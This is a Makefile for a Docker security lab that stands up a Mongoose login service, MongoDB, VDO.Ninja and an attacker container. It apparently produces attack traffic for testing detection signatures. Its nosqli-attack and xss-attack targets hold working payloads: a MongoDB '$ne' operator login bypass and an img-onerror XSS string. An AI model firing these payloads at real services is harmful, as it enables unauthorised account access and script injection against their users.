STACK_ID := 7_8_vdo_ninja_xss_nosqli
DRY_RUN_TAG := RTC_DRY_RUN
DISABLE_SHARED_LIFECYCLE_TARGETS := 1
include ../shared.mk

SERVICE ?=
NET_PREFIX ?= 10.17.$(INSTANCE_INDEX)
LAB_SUBNET ?= $(NET_PREFIX).0/24
MONGOOSE_IP ?= $(NET_PREFIX).10
VDONINJA_IP ?= $(NET_PREFIX).11
MONGO_IP ?= $(NET_PREFIX).12
ATTACKER_IP ?= $(NET_PREFIX).100
SCENARIO ?= 1
MONGOOSE_HTTP_PORT ?= 900$(INSTANCE_INDEX)
VDONINJA_HTTP_PORT ?= 1808$(INSTANCE_INDEX)
VDONINJA_PUBLIC_URL ?= http://localhost:$(VDONINJA_HTTP_PORT)
NOSQLI_USERNAME ?= Mario
NOSQLI_PASSWORD ?= not-the-real-password
XSS_PAYLOAD ?= <img src=x onerror=alert(document.domain)>
ATTACKER_IMAGE ?= curlimages/curl:8.8.0

export LAB_SUBNET MONGOOSE_IP VDONINJA_IP MONGO_IP ATTACKER_IP MONGOOSE_HTTP_PORT VDONINJA_HTTP_PORT VDONINJA_PUBLIC_URL ATTACKER_IMAGE

run:
	@$(COMPOSE) up -d --remove-orphans

start: run

stop:
	@$(COMPOSE) down --remove-orphans

build:
	@$(COMPOSE) build --no-cache $(SERVICE)
rebuild:
	@$(COMPOSE) down --rmi all --remove-orphans || true
	@$(COMPOSE) build --no-cache $(SERVICE)

is-available:
	@echo "$(CHECK_AVAILABLE_TAG)_BEGIN stack=$(STACK_ID)"
	@$(COMPOSE) config -q
	@SERVICES="$$( $(COMPOSE) config --services )"; \
	if [ -z "$$SERVICES" ]; then \
		echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) reason=no_services"; \
		exit 1; \
	fi; \
	for SVC in $$SERVICES; do \
		CID="$$( $(COMPOSE) ps -q $$SVC )"; \
		if [ -z "$$CID" ]; then \
			echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) service=$$SVC reason=not_running"; \
			exit 1; \
		fi; \
		STATE="$$(docker inspect -f '{{.State.Status}}' $$CID)"; \
		if [ "$$STATE" != "running" ]; then \
			echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) service=$$SVC reason=unexpected_state state=$$STATE"; \
			exit 1; \
		fi; \
		echo "$(CHECK_AVAILABLE_TAG)_OK stack=$(STACK_ID) service=$$SVC state=$$STATE"; \
	done; \
	echo "$(CHECK_AVAILABLE_TAG)_OK stack=$(STACK_ID) all_services=running"

dry-run:
	@echo "$(DRY_RUN_TAG)_BEGIN stack=$(STACK_ID)"
	@curl -fsS http://127.0.0.1:$(MONGOOSE_HTTP_PORT)/ >/dev/null || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=mongoose_http reason=unreachable"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=mongoose_http"
	@STATUS_CODE="$$(curl -s -o /tmp/vdo-nosqli-dry-run.out -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d '{\"username\":\"dry-run\",\"password\":\"dry-run\"}' http://127.0.0.1:$(MONGOOSE_HTTP_PORT)/login)"; \
	if [ "$$STATUS_CODE" != "200" ] && [ "$$STATUS_CODE" != "404" ]; then \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=mongoose_login_endpoint reason=unexpected_status status=$$STATUS_CODE"; \
		exit 1; \
	fi; \
	echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=mongoose_login_endpoint status=$$STATUS_CODE"
	@curl -fsS http://127.0.0.1:$(VDONINJA_HTTP_PORT)/ >/dev/null || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=vdoninja_http reason=unreachable"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=vdoninja_http"
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) ready=true"

nosqli-attack:
	@echo "[*] Running NoSQLi login bypass against node_mongoose from dedicated attacker..."
	@$(COMPOSE) exec -T attacker sh -c 'curl -s -o /tmp/nosqli.out -w "%{http_code}" \
		-X POST -H "Content-Type: application/json" \
		-d "{\"username\": \"$(NOSQLI_USERNAME)\", \"password\": {\"\$$ne\": null}}" \
		http://node_mongoose:9000/login' > /tmp/nosqli_status.txt
	@STATUS_CODE="$$(cat /tmp/nosqli_status.txt)"; \
	if [ "$$STATUS_CODE" != "200" ]; then \
		echo "[!] NoSQLi bypass failed with status $$STATUS_CODE."; \
		$(COMPOSE) exec -T attacker cat /tmp/nosqli.out || true; \
		exit 1; \
	fi; \
	$(COMPOSE) exec -T attacker grep -q "Welcome" /tmp/nosqli.out || { echo "[!] NoSQLi bypass response did not contain Welcome."; exit 1; }; \
	echo "[+] NoSQLi bypass verified."

xss-attack:
	@echo "[*] Checking vulnerable VDO.Ninja XSS surface from dedicated attacker..."
	@$(COMPOSE) exec -T attacker sh -c "curl -fsS --get \
		--data-urlencode 'room=$(XSS_PAYLOAD)' \
		http://vdoninja:18080/examples/control.html \
		-o /tmp/xss.html"
	@$(COMPOSE) exec -T attacker grep -q "roomID" /tmp/xss.html
	@$(COMPOSE) exec -T attacker grep -q "generateStreamID" /tmp/xss.html
	@if $(COMPOSE) exec -T attacker grep -q "encodeURIComponent" /tmp/xss.html; then \
		echo "[!] XSS check failed: sanitization marker found."; \
		exit 1; \
	fi
	@echo "[+] XSS vulnerable surface verified."

auto-attack: stop build start
	@EXPECTED_SIDS=""; ATTACK_TYPE=""; VICTIM_IP_VAR=""; \
	if [ "$(SCENARIO)" = "1" ] || [ "$(SCENARIO)" = "7" ]; then \
		EXPECTED_SIDS="2000007"; ATTACK_TYPE="nosql_injection"; VICTIM_IP_VAR="$(MONGOOSE_IP)"; \
	elif [ "$(SCENARIO)" = "2" ] || [ "$(SCENARIO)" = "8" ]; then \
		EXPECTED_SIDS="2000008,2000010"; ATTACK_TYPE="xss"; VICTIM_IP_VAR="$(VDONINJA_IP)"; \
	else \
		EXPECTED_SIDS="2000007,2000008,2000010"; ATTACK_TYPE="nosql_injection"; VICTIM_IP_VAR="$(MONGOOSE_IP)"; \
	fi; \
	$(RTC_EVENT) lab_ready stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) expected_sids=$$EXPECTED_SIDS attack_type=$$ATTACK_TYPE attacker_ip=$(ATTACKER_IP) victim_ip=$$VICTIM_IP_VAR probe_targets=$(ATTACKER_IP),$$VICTIM_IP_VAR probe_protocols=tcp
	@echo "[*] Waiting for mongoose, mongo, and VDO.Ninja readiness (8 seconds)..."
	@sleep 8
	@$(MAKE) attack
	@$(RTC_EVENT) lab_stop stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE)

attack:
	@if [ "$(SCENARIO)" = "1" ] || [ "$(SCENARIO)" = "7" ]; then \
		$(MAKE) nosqli-attack; \
	elif [ "$(SCENARIO)" = "2" ] || [ "$(SCENARIO)" = "8" ]; then \
		$(MAKE) xss-attack; \
	elif [ "$(SCENARIO)" = "both" ] || [ "$(SCENARIO)" = "all" ]; then \
		$(MAKE) nosqli-attack; \
		$(MAKE) xss-attack; \
	else \
		echo "[!] Invalid SCENARIO=$(SCENARIO). Use 1 (NoSQLi), 2 (XSS), both, all, or legacy 7/8."; \
		exit 1; \
	fi

# Previous implementation kept for traceability:
# if [ "$(SCENARIO)" = "7" ]; then
# 	$(MAKE) nosqli-attack;
# elif [ "$(SCENARIO)" = "8" ]; then
# 	$(MAKE) xss-attack;
# elif [ "$(SCENARIO)" = "both" ]; then
# 	$(MAKE) nosqli-attack;
# 	$(MAKE) xss-attack;
# else
# 	echo "[!] Invalid SCENARIO=$(SCENARIO). Use 7 (NoSQLi), 8 (XSS), or both.";
# 	exit 1;
# fi
# Change rationale: align with 1/2 convention used by other paired labs while accepting legacy aliases.
